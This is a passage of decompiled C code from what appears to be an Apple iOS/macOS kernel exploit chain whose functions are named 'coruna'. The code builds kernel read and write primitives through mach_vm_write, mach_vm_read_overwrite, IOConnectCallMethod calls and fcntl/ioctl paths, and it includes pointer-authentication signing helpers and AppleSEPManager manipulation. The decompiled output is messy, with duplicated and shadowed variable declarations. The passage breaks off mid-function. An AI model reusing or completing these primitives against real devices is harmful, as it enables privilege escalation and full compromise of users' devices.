    err = coruna_kernel5_via_mach_vm_machine_attribute_1e01c(handle,version,&bootargs,*(uint32_t *)(handle + 0x168),0);
    if (err != 0) {
      port = *(uint64_t *)(handle + 0x230);
      err = coruna_kernel5_via_kernel5_via_kernel5_via_thread_get_state_3(handle,port,4,(long)&scratch + 4,0);
      if (err != 0) {
        scratch = coruna_u64_pack((scratch), (scratch)) | 0x20;
        err = coruna_kernel5_via_mach_vm_machine_attribute_1e01c(handle,port,&scratch,4,0);
        if (err != 0) {
          err = _task_map_corpse_info_64
                            (*(uint32_t *)k_kernel_mach_task_self_slot,
                             *(uint32_t *)k_kernel_mach_task_self_slot,&host_info,&thread_attr);
          if (((err == 0) && (host_info != (void *)0x0)) && (thread_attr == 0x4000)) {
            _memcpy(ctx,host_info,0x4000);
          }
          coruna_kernel5_via_mach_vm_machine_attribute_1e01c(handle,port,(long)&scratch + 4,4,0);
        }
      }
      bootargs = 0;
      coruna_kernel5_via_mach_vm_machine_attribute_1e01c(handle,version,&bootargs,*(uint32_t *)(handle + 0x168),0);
    }
  }
fail:
  if ((host_info != (void *)0x0) && (thread_attr != 0)) {
    _mach_vm_deallocate(*(vm_map_t *)k_kernel_mach_task_self_slot,(mach_vm_address_t)host_info,
                        thread_attr);
  }
  return;
}
void coruna_kernel5_residual_255(long handle,long addr_2)
{
  int err;
  uint8_t scratch[160];
  uint64_t bootargs;
  uint64_t scratch;
  uint64_t thread_attr;
  uint64_t bootargs;
  uint64_t host_info;
  long serial_buf;
  uint64_t thread_attr;
  long action;
  uint64_t block_ctx;
  uint64_t host_info;
  uint64_t serial_buf;
  uint64_t action;
  uint64_t stack_guard;
  uint64_t block_ctx;
  uint64_t stack_guard;
  uint64_t sa_saved;
  uint64_t sa_saved;
  uint64_t sa_new;
  uint64_t path_buf;
  uint64_t tmp_buf;
  long sa_new;
  
  sa_new = *(long *)k_kernel_stack_chk_guard_slot;
  if (((*(int *)(&k_kernel_slot_1930 + handle) != -1) && (*(int *)(&k_kernel_slot_1934 + handle) != -1)) &&
     (*(long *)(handle + 0x218) != 0)) {
    host_info = 0;
    thread_attr = 0;
    action = addr_2 + -0x60;
    sa_new = 0;
    sa_saved = 0;
    tmp_buf = 0;
    path_buf = 0;
    block_ctx = 0;
    sa_saved = 0;
    stack_guard = 0;
    host_info = 0;
    block_ctx = 0;
    action = 0;
    scratch = 0;
    bootargs = 0;
    bootargs = 0;
    thread_attr = k_kernel_rodata_word_33930;
    serial_buf = *(long *)(handle + 0x218) + 0x60;
    stack_guard = 2;
    serial_buf = 0x22000000;
    err = coruna_kernel5_residual_237(&k_kernel_slot_1930 + handle,&bootargs,0xa0);
    if ((err == 0) && (err = coruna_kernel5_residual_238(&k_kernel_slot_1930 + handle,scratch,0xa0), err == 0)
       ) {
      _memcmp(&bootargs,scratch,0xa0);
    }
  }
  if (*(long *)k_kernel_stack_chk_guard_slot == sa_new) {
    return;
  }
  ___stack_chk_fail();
}
void coruna_kernel5_residual_256(long handle)
{
  int err;
  uint8_t scratch[160];
  uint64_t bootargs;
  uint64_t scratch;
  uint64_t thread_attr;
  uint64_t bootargs;
  uint64_t host_info;
  long serial_buf;
  uint64_t thread_attr;
  uint64_t host_info;
  uint64_t action;
  uint64_t serial_buf;
  uint64_t action;
  uint64_t block_ctx;
  uint64_t block_ctx;
  uint64_t stack_guard;
  uint64_t sa_saved;
  uint64_t sa_new;
  uint64_t stack_guard;
  uint64_t path_buf;
  uint64_t tmp_buf;
  uint64_t region;
  long sa_saved;
  
  sa_saved = *(long *)k_kernel_stack_chk_guard_slot;
  if (((*(int *)(&k_kernel_slot_1930 + handle) != -1) && (*(int *)(&k_kernel_slot_1934 + handle) != -1)) &&
     (*(long *)(handle + 0x218) != 0)) {
    path_buf = 0;
    stack_guard = 0;
    region = 0;
    tmp_buf = 0;
    stack_guard = 0;
    sa_new = 0;
    sa_saved = 0;
    serial_buf = 0;
    action = 0;
    block_ctx = 0;
    host_info = 0;
    host_info = 0;
    thread_attr = 0;
    scratch = 0;
    bootargs = 0;
    bootargs = 0;
    thread_attr = k_kernel_rodata_word_33930;
    serial_buf = *(long *)(handle + 0x218) + 0x60;
    block_ctx = 3;
    action = 0x22000000;
    err = coruna_kernel5_residual_237(&k_kernel_slot_1930 + handle,&bootargs,0xa0);
    if ((err == 0) && (err = coruna_kernel5_residual_238(&k_kernel_slot_1930 + handle,scratch,0xa0), err == 0)
       ) {
      _memcmp(&bootargs,scratch,0xa0);
    }
  }
  if (*(long *)k_kernel_stack_chk_guard_slot == sa_saved) {
    return;
  }
  ___stack_chk_fail();
}
void coruna_fcntl_1bf8c(long handle,long addr_2,long off_3,uint size,int flags)
{
  unsigned long u;
  uint size;
  int err;
  long handle;
  uint version;
  uint port;
  uint32_t scratch;
  uint32_t bootargs;
  
  if ((((*(int *)(&k_kernel_slot_1930 + handle) != -1) && (*(int *)(&k_kernel_slot_1934 + handle) != -1)) &&
      (*(int *)(&k_kernel_slot_1940 + handle) != -1)) &&
     ((*(long *)(handle + 0x218) != 0 && (handle = coruna_kernel5_residual_225(handle), handle != 0)))) {
    bootargs = 0xffffffff;
    if ((flags == 0) ||
       ((err = coruna_open_dev_null(&bootargs), err == 0 &&
        (err = coruna_kernel5_residual_236(&k_kernel_slot_1930 + handle), err == 0)))) {
      if (size != 0) {
        version = 0;
        do {
          size = size - version;
          scratch = 0;
          handle = addr_2 + (unsigned long)version;
          if (size < 4) {
            port = 0;
            if ((((handle + (unsigned long)size) - 1 ^ handle + 3U) &
                (*(unsigned long *)(handle + 0x188) ^ 0xffffffffffffffff)) != 0) {
              port = 4 - size;
            }
          }
          else {
            port = 0;
          }
          u = 4 - (unsigned long)port;
          if ((unsigned long)size <= 4 - (unsigned long)port) {
            u = (unsigned long)size;
          }
          if (((u < 4) &&
              (err = coruna_fcntl_1b580(handle,handle - (unsigned long)port,&scratch,4,0), err != 0)) ||
             (err = coruna_kernel5_residual_255(handle,handle - (unsigned long)port), err != 0)) {
fail:
            coruna_kernel5_residual_256(handle);
            {
              if (flags == 0) {
              return;
              }
            }
          }
          _memcpy((void *)((long)&scratch + (unsigned long)port),(void *)(off_3 + (unsigned long)version),u);
          if (*(long *)(handle + 0x220) == 0) {
            err = _fcntl(*(int *)(&k_kernel_slot_1940 + handle),6);
          }
          else {
            err = _ioctl(*(int *)(&k_kernel_slot_1940 + handle),0x8004667c);
          }
          if (err != 0) {
            ___error();
            ___error();
            {
              coruna_kernel5_residual_256(handle);
              {
              if (flags == 0) {
              return;
              }
              }
            }
          }
          version = (version - port) + 4;
        } while (version < size);
      }
      coruna_kernel5_residual_256(handle);
done:
      if (flags == 0) {
        return;
      }
    }
    coruna_close(bootargs);
  }
  return;
}
void coruna_semaphore_destroy(long handle,int flags)
{
  pthread_t p_Var1;
  long *ptr;
  
  ptr = *(long **)(handle + 0x28);
  if (ptr != (long *)0x0) {
    *(uint8_t *)(handle + 0xc) = 0;
    *(uint64_t *)(handle + 0x28) = 0;
    p_Var1 = (pthread_t)*ptr;
    if (p_Var1 != (pthread_t)0x0) {
      if (1 < *(semaphore_t *)(ptr + 1) + 1 && flags != 0) {
        *(uint8_t *)(ptr + 7) = 1;
        _semaphore_signal(*(semaphore_t *)(ptr + 1));
        p_Var1 = (pthread_t)*ptr;
      }
      _pthread_join(p_Var1,(void **)0x0);
      *ptr = 0;
    }
    if (1 < *(semaphore_t *)(ptr + 1) + 1) {
      _semaphore_destroy(*(task_t *)k_kernel_mach_task_self_slot,*(semaphore_t *)(ptr + 1));
      *(uint32_t *)(ptr + 1) = 0;
    }
    if (1 < *(semaphore_t *)((long)ptr + 0xc) + 1) {
      _semaphore_destroy(*(task_t *)k_kernel_mach_task_self_slot,
                         *(semaphore_t *)((long)ptr + 0xc));
      *(uint32_t *)((long)ptr + 0xc) = 0;
    }
    if ((int)ptr[2] != -1) {
      _close((int)ptr[2]);
      *(uint32_t *)(ptr + 2) = 0xffffffff;
    }
    ptr[5] = 0;
    ptr[4] = 0;
    ptr[7] = 0;
    ptr[6] = 0;
    ptr[1] = 0;
    *ptr = 0;
    ptr[3] = 0;
    ptr[2] = 0;
    _free(ptr);
  }
  return;
}
void coruna_open_sepmgr(long handle)
{
  uint8_t *ptr;
  kern_return_t lk2;
  int err;
  uint64_t *buf;
  unsigned long u;
  bool err;
  uint64_t scratch;
  semaphore_t bootargs [2];
  
  if (*(unsigned long *)(handle + 0x158) < 0x1f530000000000) {
    if (*(char *)(handle + 0xc) == '\0') {
      u = (unsigned long)*(uint *)(handle + 0x10);
      if (*(uint *)(handle + 0x10) + 1 < 2) {
        u = coruna_ioservicegetmatchingservice_1a3ec("AppleSEPManager");
        if ((int)u + 1U < 2) {
          return;
        }
        *(int *)(handle + 0x10) = (int)u;
      }
      ptr = k_kernel_mach_task_self_slot;
      err = false;
      do {
        err = __IOServiceSetAuthorizationID(u,0);
        if (err != -0x1ffffd3f) {
          if (err != 0) {
            return;
          }
          *(uint8_t *)(handle + 0xc) = 1;
          return;
        }
        if (err) {
          return;
        }
        err = coruna_kernel5_via_plist_dict(handle,*(uint32_t *)ptr);
        err = true;
      } while (err != 0);
    }
  }
  else {
    scratch = 0;
    bootargs[0] = 0;
    bootargs[1] = 0;
    if ((*(char *)(handle + 0xc) == '\0') &&
       (buf = _calloc(1,0x40), buf != (uint64_t *)0x0)) {
      *(uint32_t *)(buf + 2) = 0xffffffff;
      *(uint64_t **)(handle + 0x28) = buf;
      ptr = k_kernel_mach_task_self_slot;
      lk2 = _semaphore_create(*(task_t *)k_kernel_mach_task_self_slot,bootargs + 1,0,0);
      if (lk2 == 0) {
        *(semaphore_t *)(buf + 1) = bootargs[1];
        lk2 = _semaphore_create(*(task_t *)ptr,bootargs,0,0);
        if (lk2 == 0) {
          *(semaphore_t *)((long)buf + 0xc) = bootargs[0];
          err = coruna_pthread_attr_setdetachstate_2c464(handle,&scratch,coruna_mach_port_deallocate_1e398,handle);
          if (err == 0) {
            *buf = scratch;
            lk2 = _semaphore_timedwait(bootargs[0],(mach_timespec_t)0x3);
            if ((*(int *)((long)buf + 0x3c) == 0) && (lk2 == 0)) {
fail:
              *(uint8_t *)(handle + 0xc) = 1;
              return;
            }
          }
        }
      }
      coruna_semaphore_destroy(handle,0);
    }
  }
  return;
}
void coruna_ioconnectcallmethod(long handle,long addr_2,int flags)
{
  uint32_t u;
  uint64_t size;
  int err;
  long handle;
  long addr;
  uint32_t *ptr;
  long off;
  uint8_t scratch[8];
  long bootargs;
  uint thread_attr;
  uint32_t host_info;
  uint32_t serial_buf;
  uint16_t action[2];
  uint32_t block_ctx;
  uint64_t stack_guard;
  long sa_saved;
  uint64_t sa_new;
  uint64_t path_buf;
  uint64_t scratch;
  uint64_t tmp_buf;
  uint64_t bootargs;
  uint64_t region;
  uint64_t thread_attr;
  unsigned long plist;
  uint64_t url_buf;
  uint64_t host_info;
  uint64_t json_buf;
  long frame;
  
  frame = *(long *)k_kernel_stack_chk_guard_slot;
  off = *(long *)(&k_kernel_slot_1d58 + handle);
  block_ctx = 0x4000;
  sa_saved = addr_2;
  handle = coruna_mach_port_request_notification_29a50(handle,&block_ctx);
  if (handle != 0) {
    action[0] = 0x100;
    err = coruna_call_mach_vm_machine_attribute_1d4f8_2b614(handle,handle,action,2);
    if (((((err != 0) &&
          (err = coruna_kernel5_residual_307(handle,*(long *)(off + 0xe8) + (unsigned long)*(uint *)(off + 0xb8),
                                &stack_guard), err != 0)) &&
         (err = coruna_call_mach_vm_machine_attribute_1d4f8_2667c(handle,*(long *)(off + 0xf0) + (unsigned long)*(uint *)(off + 0xb4),4,
                               &serial_buf), err != 0)) &&
        ((err = coruna_call_mach_vm_machine_attribute_1d4f8_2667c(handle,*(long *)(off + 0xf0) + (unsigned long)*(uint *)(off + 0xc4),4,
                               &host_info), err != 0 &&
         (err = coruna_call_mach_vm_machine_attribute_1d4f8_2667c(handle,*(long *)(off + 0xf0) + (unsigned long)*(uint *)(off + 0xc0),4,
                               &thread_attr), err != 0)))) &&
       ((err = coruna_kernel5_residual_307(handle,*(long *)(off + 0xf0) + (unsigned long)*(uint *)(off + 0xbc),
                              &bootargs), err != 0 &&
        ((bootargs != 0 &&
         (err = coruna_call_mach_vm_machine_attribute_1d4f8_2667c(handle,bootargs + (unsigned long)*(uint *)(off + 0xac),8,scratch),
         err != 0)))))) {
      u = 0x10002;
      if (*(unsigned long *)(handle + 0x158) < 0x27120000000000) {
        u = 0x10003;
      }
      ptr = *(uint32_t **)(off + 0x98);
      *ptr = u;
      ptr[1] = 0x10;
      *(uint16_t *)(ptr + 2) = 0;
      size = k_kernel_rodata_word_43340;
      addr = *(long *)(off + 0xa0);
      *(uint64_t *)(addr + 0x10) = k_kernel_rodata_word_00043348;
      *(uint64_t *)(addr + 8) = size;
      plist = (unsigned long)*(uint *)(off + 0xc);
      host_info = k_kernel_rodata_word_00043808;
      url_buf = k_kernel_rodata_word_43800;
      json_buf = 0x38;
      bootargs = 0;
      tmp_buf = 0;
      thread_attr = 0;
      region = 0;
      scratch = 0;
      path_buf = 0;
      sa_new = *(uint64_t *)(off + 0x1c);
      sa_saved = addr_2 - (unsigned long)thread_attr;
      err = coruna_call_mach_vm_machine_attribute_1d4f8_2b508(handle,*(long *)(off + 0xe8) + (unsigned long)*(uint *)(off + 0xb8),handle);
      if (err != 0) {
        err = coruna_mach_vm_machine_attribute(handle,*(long *)(off + 0xf0) + (unsigned long)*(uint *)(off + 0xb4),1);
        if (err != 0) {
          err = coruna_mach_vm_machine_attribute(handle,*(long *)(off + 0xf0) + (unsigned long)*(uint *)(off + 0xc4),
                               flags + -0x100);
          if (err != 0) {
            err = coruna_call_mach_vm_machine_attribute_1d4f8_2b614(handle,bootargs + (unsigned long)*(uint *)(off + 0xac),&sa_saved,8);
            if (err != 0) {
              _IOConnectCallMethod
                        (*(uint32_t *)(off + 8),0x1a,&plist,4,&sa_new,0x38,0,0,0,0);
              coruna_call_mach_vm_machine_attribute_1d4f8_2b614(handle,bootargs + (unsigned long)*(uint *)(off + 0xac),scratch,8);
            }
            coruna_mach_vm_machine_attribute(handle,*(long *)(off + 0xf0) + (unsigned long)*(uint *)(off + 0xc4),host_info);
          }
          coruna_mach_vm_machine_attribute(handle,*(long *)(off + 0xf0) + (unsigned long)*(uint *)(off + 0xb4),serial_buf);
        }
        coruna_call_mach_vm_machine_attribute_1d4f8_2b508(handle,*(long *)(off + 0xe8) + (unsigned long)*(uint *)(off + 0xb8),stack_guard);
      }
    }
  }
  if (*(long *)k_kernel_stack_chk_guard_slot == frame) {
    return;
  }
  ___stack_chk_fail();
}
void coruna_ioconnectcallmethod_1c8a8(long handle,long addr_2,long off_3,uint size,int flags)
{
  long handle;
  unsigned long u;
  long addr;
  uint size;
  int err;
  long off;
  uint64_t version;
  uint port;
  uint tag;
  uint64_t scratch;
  uint32_t bootargs;
  unsigned long thread_attr [3];
  long host_info;
  
  host_info = *(long *)k_kernel_stack_chk_guard_slot;
  if (((((1 < *(int *)(handle + 0xe8) + 1U) && (*(long *)(handle + 0xf8) != 0)) &&
       (*(long *)(handle + 0x100) != 0)) && (off = coruna_kernel5_residual_225(handle), off != 0)) &&
     ((bootargs = 0xffffffff, flags == 0 || (err = coruna_open_dev_null(&bootargs), err == 0)))) {
    if (size != 0) {
      port = 0;
      while( true ) {
        size = size - port;
        scratch = 0;
        off = addr_2 + (unsigned long)port;
        if (size < 8) {
          tag = 0;
          if ((((off + (unsigned long)size) - 1 ^ off + 7U) &
              (*(unsigned long *)(handle + 0x188) ^ 0xffffffffffffffff)) != 0) {
            tag = 8 - size;
          }
        }
        else {
          tag = 0;
        }
        u = 8 - (unsigned long)tag;
        if ((unsigned long)size <= 8 - (unsigned long)tag) {
          u = (unsigned long)size;
        }
        if ((u < 8) &&
           (err = coruna_ioconnectcallmethod(handle,off - (unsigned long)tag,&scratch,8,0), err != 0)) break;
        _memcpy((void *)((long)&scratch + (unsigned long)tag),(void *)(off_3 + (unsigned long)port),u);
        err = *(int *)(handle + 0xe8);
        if ((err + 1U < 2) ||
           ((*(long *)(handle + 0xf8) == 0 || (*(long *)(handle + 0x100) == 0)))) break;
        handle = *(long *)(handle + 0x108) + *(long *)(handle + 0xf8);
        addr = 0x368;
        if (*(int *)(handle + 0x140) < 0x2258) {
          addr = 0x360;
        }
        version = *(uint64_t *)(handle + addr);
        *(unsigned long *)(handle + addr) = off - (unsigned long)tag;
        thread_attr[0] = (unsigned long)*(uint *)(handle + 0x110);
        thread_attr[1] = 0;
        thread_attr[2] = scratch;
        err = _IOConnectCallMethod(err,0x21,thread_attr,3,0,0,0,0,0,0);
        if ((*(long *)(handle + 0xf8) == 0) || (*(long *)(handle + 0x100) == 0)) break;
        off = 0x368;
        if (*(int *)(handle + 0x140) < 0x2258) {
          off = 0x360;
        }
        *(uint64_t *)(*(long *)(handle + 0x108) + *(long *)(handle + 0xf8) + off) = version;
        if ((err != 0) || (port = (port - tag) + 8, size <= port)) break;
      }
    }
    if (flags != 0) {
      coruna_close(bootargs);
    }
  }
  if (*(long *)k_kernel_stack_chk_guard_slot == host_info) {
    return;
  }
  ___stack_chk_fail();
}
void coruna_mach_port_deallocate_1cb2c(long handle)
{
  vm_address_t address;
  
  if (1 < *(int *)(handle + 0x5c) + 1U) {
    _IOObjectRelease();
    *(uint32_t *)(handle + 0x5c) = 0;
  }
  address = *(vm_address_t *)(handle + 0x60);
  if ((address != 0) && (*(vm_size_t *)(handle + 0x68) != 0)) {
    _vm_deallocate(*(vm_map_t *)k_kernel_mach_task_self_slot,address,*(vm_size_t *)(handle + 0x68)
                  );
    *(vm_address_t *)(handle + 0x60) = 0;
    *(uint64_t *)(handle + 0x68) = 0;
  }
  *(uint64_t *)(handle + 0x70) = 0;
  *(uint64_t *)(handle + 0x78) = 0;
  if (1 < *(mach_port_name_t *)(handle + 0x58) + 1) {
    _mach_port_deallocate
              (*(ipc_space_t *)k_kernel_mach_task_self_slot,*(mach_port_name_t *)(handle + 0x58));
    *(uint32_t *)(handle + 0x58) = 0;
  }
  return;
}
void coruna_pthread_from_mach_thread_np_1cbd8(long handle)
{
  pthread_t p_Var1;
  vm_address_t address;
  
  if (1 < *(mach_port_t *)(handle + 0xac) + 1) {
    p_Var1 = _pthread_from_mach_thread_np(*(mach_port_t *)(handle + 0xac));
    if (1 < *(semaphore_t *)(handle + 0xd0) + 1) {
      _semaphore_signal(*(semaphore_t *)(handle + 0xd0));
      _semaphore_destroy(*(task_t *)k_kernel_mach_task_self_slot,*(semaphore_t *)(handle + 0xd0));
      *(uint32_t *)(handle + 0xd0) = 0;
    }
    if (p_Var1 != (pthread_t)0x0) {
      _pthread_join(p_Var1,(void **)0x0);
    }
    *(uint32_t *)(handle + 0xac) = 0;
  }
  address = *(vm_address_t *)(handle + 0xb0);
  if ((address != 0) && (*(vm_size_t *)(handle + 0xb8) != 0)) {
    _vm_deallocate(*(vm_map_t *)k_kernel_mach_task_self_slot,address,*(vm_size_t *)(handle + 0xb8)
                  );
    *(vm_address_t *)(handle + 0xb0) = 0;
    *(uint64_t *)(handle + 0xb8) = 0;
  }
  *(uint64_t *)(handle + 200) = 0;
  if (1 < *(mach_port_name_t *)(handle + 0x58) + 1) {
    _mach_port_deallocate
              (*(ipc_space_t *)k_kernel_mach_task_self_slot,*(mach_port_name_t *)(handle + 0x58));
    *(uint32_t *)(handle + 0x58) = 0;
  }
  return;
}
void coruna_kernel5_residual_257(uint *size,uint64_t val,uint64_t *id_2)
{
  int err;
  uint64_t u;
  
  err = coruna_kernel5_via_kernel5_via_kernel5_via_thread_get_state_2();
  if (err != 0) {
    u = *id_2;
    if ((*size & 0x5584001) != 0) {
      u = coruna_kernel5_via_pacia_12_11(size);
    }
    *id_2 = u;
  }
  return;
}
void coruna_kernel5_residual_258(long handle,uint64_t val,uint64_t id_2)
{
  uint64_t scratch;
  
  scratch = id_2;
  coruna_kernel5_via_mach_vm_machine_attribute_1e01c(handle,val,&scratch,*(uint32_t *)(handle + 0x168),1);
  return;
}
void coruna_vm_deallocate_1cda0(long handle)
{
  vm_address_t address;
  uint64_t *ptr;
  
  ptr = *(uint64_t **)(&k_kernel_slot_1d48 + handle);
  if (ptr != (uint64_t *)0x0) {
    address = ptr[2];
    if ((address != 0) && (ptr[3] != 0)) {
      _vm_deallocate(*(vm_map_t *)k_kernel_mach_task_self_slot,address,ptr[3]);
      ptr[2] = 0;
      ptr[3] = 0;
      ptr = *(uint64_t **)(&k_kernel_slot_1d48 + handle);
      if (ptr == (uint64_t *)0x0) {
        return;
      }
    }
    *(uint64_t *)(&k_kernel_slot_1d48 + handle) = 0;
    *(uint8_t *)(ptr + 9) = 1;
    ___ulock_wake(0x201,(long)ptr + 0x34,*(uint32_t *)(ptr + 6));
    _pthread_join((pthread_t)ptr[5],(void **)0x0);
    ptr[1] = 0;
    *ptr = 0;
    ptr[3] = 0;
    ptr[2] = 0;
    ptr[5] = 0;
    ptr[4] = 0;
    ptr[7] = 0;
    ptr[6] = 0;
    ptr[9] = 0;
    ptr[8] = 0;
    ptr[0xb] = 0;
    ptr[10] = 0;
    ptr[0xd] = 0;
    ptr[0xc] = 0;
    ptr[0xe] = 0;
    _free(ptr);
  }
  return;
}
void coruna_mach_vm_machine_attribute(long handle,mach_vm_address_t arg,uint32_t size)
{
  uint32_t scratch;
  vm_machine_attribute_val_t bootargs;
  
  scratch = size;
  if (*(long *)(handle + 0x40) != 0) {
    coruna_kernel5_via_helper_5d2c_32264(handle,arg,&scratch,4,1);
  }
  if (((*(int *)(handle + 0xe8) + 1U < 2) || (*(long *)(handle + 0xf8) == 0)) ||
     (*(long *)(handle + 0x100) == 0)) {
    if (*(long *)(&k_kernel_slot_1d40 + handle) == 0) {
      if ((*(int *)(&k_kernel_slot_1930 + handle) != -1) && (*(int *)(&k_kernel_slot_1934 + handle) != -1)) {
        if ((*(int *)(&k_kernel_slot_1940 + handle) != -1) && (*(long *)(handle + 0x218) != 0)) {
          coruna_fcntl_1bf8c(handle,arg,&scratch,4,1);
          return;
        }
        if ((*(int *)(&k_kernel_slot_1938 + handle) != -1) && (*(int *)(&k_kernel_slot_193c + handle) != -1))
        {
          coruna_kernel5_via_open_dev_null(handle,arg,&scratch,4,1);
          return;
        }
      }
      _mach_vm_write(*(vm_map_t *)(&k_kernel_slot_1918 + handle),arg,(vm_offset_t)&scratch,4);
      bootargs = 7;
      _mach_vm_machine_attribute(*(vm_map_t *)(&k_kernel_slot_1918 + handle),arg,4,1,&bootargs);
    }
    else {
      coruna_kernel5_via_thread_switch(handle,arg,&scratch,4,1);
    }
  }
  else {
    coruna_ioconnectcallmethod_1c8a8(handle,arg,&scratch,4,1);
  }
  return;
}
void coruna_kernel5_via_kernel5_via_kernel5_via_thread_get_state(long handle,uint64_t val,uint64_t id_2)
{
  uint8_t scratch[8];
  
  if (*(long *)(handle + 0x30) != 0) {
    coruna_kernel5_via_helper_5d2c_32264(handle,val,id_2,4,1);
  }
  if (((*(int *)(handle + 0xe8) + 1U < 2) || (*(long *)(handle + 0xf8) == 0)) ||
     (*(long *)(handle + 0x100) == 0)) {
    if (*(long *)(&k_kernel_slot_1d40 + handle) == 0) {
      if ((*(int *)(&k_kernel_slot_1930 + handle) != -1) && (*(int *)(&k_kernel_slot_1934 + handle) != -1)) {
        if ((*(int *)(&k_kernel_slot_1940 + handle) != -1) && (*(long *)(handle + 0x218) != 0)) {
          coruna_fcntl_1b580(handle,val,id_2,4,1);
          return;
        }
        if ((*(int *)(&k_kernel_slot_1938 + handle) != -1) && (*(int *)(&k_kernel_slot_193c + handle) != -1))
        {
          coruna_kernel5_via_u64_pack(handle,val,id_2,4,1);
          return;
        }
      }
      coruna_mach_vm_read_overwrite(*(uint32_t *)(&k_kernel_slot_1918 + handle),val,4,
                   *(uint32_t *)(handle + 0x178),id_2,scratch);
    }
    else {
      coruna_kernel5_via_kernel5_via_thread_get_state(handle,val,id_2,4,1);
    }
  }
  else {
    coruna_ioconnectcallmethod(handle,val,id_2,4,1);
  }
  return;
}
void coruna_mach_vm_read_overwrite(vm_map_t arg,long handle,unsigned long arg_x,unsigned long arg,long addr_2,
                 unsigned long *val)
{
  unsigned long u;
  mach_vm_size_t size;
  kern_return_t lk2;
  unsigned long size;
  unsigned long scratch;
  
  if (arg_x != 0) {
    size = 0;
    u = arg_x;
    if (arg != 0) {
      u = arg;
    }
    do {
      size = arg_x;
      if (u <= arg_x) {
        size = u;
      }
      scratch = arg_x;
      lk2 = _mach_vm_read_overwrite(arg,size + handle,size,size + addr_2,&scratch);
      if (lk2 != 0) {
        return;
      }
      size = (unsigned long)(uint)((int)scratch + (int)size);
      arg_x = arg_x - scratch;
    } while (arg_x != 0);
    if (val != (unsigned long *)0x0) {
      *val = size;
    }
  }
  return;
}
void coruna_kernel5_via_kernel5_via_kernel5_via_thread_get_state_2(long handle,uint64_t val,uint64_t *id_2)
{
  uint8_t scratch[8];
  
  *id_2 = 0;
  if (*(long *)(handle + 0x30) != 0) {
    coruna_kernel5_via_helper_5d2c_32264(handle,val,id_2,*(uint32_t *)(handle + 0x168),1);
  }
  if (((*(int *)(handle + 0xe8) + 1U < 2) || (*(long *)(handle + 0xf8) == 0)) ||
     (*(long *)(handle + 0x100) == 0)) {
    if (*(long *)(&k_kernel_slot_1d40 + handle) == 0) {
      if ((*(int *)(&k_kernel_slot_1930 + handle) != -1) && (*(int *)(&k_kernel_slot_1934 + handle) != -1)) {
        if ((*(int *)(&k_kernel_slot_1940 + handle) != -1) && (*(long *)(handle + 0x218) != 0)) {
          coruna_fcntl_1b580(handle,val,id_2,*(uint32_t *)(handle + 0x168),1);
          return;
        }
        if ((*(int *)(&k_kernel_slot_1938 + handle) != -1) && (*(int *)(&k_kernel_slot_193c + handle) != -1))
        {
          coruna_kernel5_via_u64_pack(handle,val,id_2,*(uint32_t *)(handle + 0x168),1);
          return;
        }
      }
      coruna_mach_vm_read_overwrite(*(uint32_t *)(&k_kernel_slot_1918 + handle),val,(long)*(int *)(handle + 0x168),
                   *(uint32_t *)(handle + 0x178),id_2,scratch);
    }
    else {
      coruna_kernel5_via_kernel5_via_thread_get_state(handle,val,id_2,*(uint32_t *)(handle + 0x168),1);
    }
  }
  else {
    coruna_ioconnectcallmethod(handle,val,id_2,*(uint32_t *)(handle + 0x168),1);
  }
  return;
}
void coruna_kernel5_via_pacia_12_9(uint *size,uint64_t val)
{
  int err;
  
  err = coruna_pacia_12(size,0x5584001);
  if ((err != 0) && ((*size & 0x5584001) != 0)) {
    coruna_kernel5_via_pacia_12_11(size,val);
  }
  return;
}
void coruna_kernel5_via_pacia_12_10(uint64_t val,uint64_t id_2)
{
  int err;
  
  err = coruna_pacia_12(val,0x5584001);
  if (err != 0) {
    coruna_kernel5_via_pacia_12_11(val,id_2);
  }
  return;
}
void coruna_kernel5_via_pacia_12_11(uint64_t val,unsigned long arg)
{
  int err;
  
  if (((arg != 0) && ((arg >> 0x37 & 1) != 0)) &&
     (err = coruna_pacia_12(val,8), err == 0)) {
    coruna_pacia_12(val,0x5000000);
  }
  return;
}
void coruna_mach_vm_machine_attribute_1d4f8(long handle,mach_vm_address_t arg,uint64_t val,int flags)
{
  int err;
  kern_return_t lk2;
  long handle;
  mach_vm_address_t *lpm4;
  uint64_t scratch;
  uint64_t bootargs;
  uint64_t thread_attr;
  
  scratch = val;
  if (*(long *)(handle + 0x40) != 0) {
    coruna_kernel5_via_helper_5d2c_32264(handle,arg,&scratch,*(uint32_t *)(handle + 0x168),1);
  }
  if (((*(int *)(handle + 0xe8) + 1U < 2) || (*(long *)(handle + 0xf8) == 0)) ||
     (*(long *)(handle + 0x100) == 0)) {
    if (*(long *)(&k_kernel_slot_1d40 + handle) == 0) {
      if ((*(int *)(&k_kernel_slot_1930 + handle) != -1) && (*(int *)(&k_kernel_slot_1934 + handle) != -1)) {
        if ((*(int *)(&k_kernel_slot_1940 + handle) != -1) && (*(long *)(handle + 0x218) != 0)) {
          bootargs = val;
          if (flags == 0) {
            coruna_fcntl_1bf8c(handle,arg,&bootargs,*(uint32_t *)(handle + 0x168),1);
            return;
          }
          err = coruna_mach_absolute_time_1a9c0(handle,1,&k_kernel_slot_2710);
          if (err != 0) {
            return;
          }
          if (*(unsigned long *)(handle + 0x158) < 0x1f530000000000) {
            coruna_open_sepmgr_1e638(handle,arg,val);
          }
          else {
            handle = *(long *)(handle + 0x28);
            if (((handle != 0) && (1 < *(semaphore_t *)(handle + 8) + 1)) &&
               (1 < *(int *)(handle + 0xc) + 1U)) {
              lpm4 = (mach_vm_address_t *)(handle + 0x20);
              *lpm4 = arg;
              *(uint64_t **)(handle + 0x28) = &thread_attr;
              *(uint64_t *)(handle + 0x30) = 8;
              thread_attr = val;
              lk2 = _semaphore_signal(*(semaphore_t *)(handle + 8));
              if ((lk2 == 0) &&
                 (_semaphore_timedwait(*(semaphore_t *)(handle + 0xc),(mach_timespec_t)0x3),
                 *(int *)(handle + 0x3c) != 0)) {
                *lpm4 = 0;
                *(uint64_t *)(handle + 0x28) = 0;
                *(uint64_t *)(handle + 0x30) = 0;
                coruna_semaphore_destroy(handle,0);
              }
              else {
                *lpm4 = 0;
                *(uint64_t *)(handle + 0x28) = 0;
                *(uint64_t *)(handle + 0x30) = 0;
              }
            }
          }
          if (*(long *)(handle + 0x118) == 0) {
            return;
          }
          if (*(long *)(handle + 0x120) == 0) {
            return;
          }
          *(uint32_t *)(*(long *)(handle + 0x118) + 1) = 0;
          return;
        }
        if ((*(int *)(&k_kernel_slot_1938 + handle) != -1) && (*(int *)(&k_kernel_slot_193c + handle) != -1))
        {
